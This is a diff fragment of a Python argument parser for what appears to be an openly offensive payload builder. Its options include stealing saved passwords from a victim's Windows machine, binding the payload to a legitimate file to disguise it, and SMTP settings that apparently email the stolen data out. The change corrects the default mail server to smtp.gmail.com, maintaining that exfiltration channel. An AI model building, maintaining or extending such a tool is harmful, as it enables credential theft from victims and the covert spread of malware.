@@ -32,7 +32,7 @@ def get_arguments():
     parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
-    parser.add_argument("-x", "--smtp", dest="smtp_server", help="Enter custom email smtp server. default=smtp.google.com", default="smtp.google.com")
+    parser.add_argument("-x", "--smtp", dest="smtp_server", help="Enter custom email smtp server. default=smtp.gmail.com", default="smtp.gmail.com")
     parser.add_argument("-y", "--port", dest="smtp_port", help="Enter custom email smtp port. default=587", default=587)
     
     
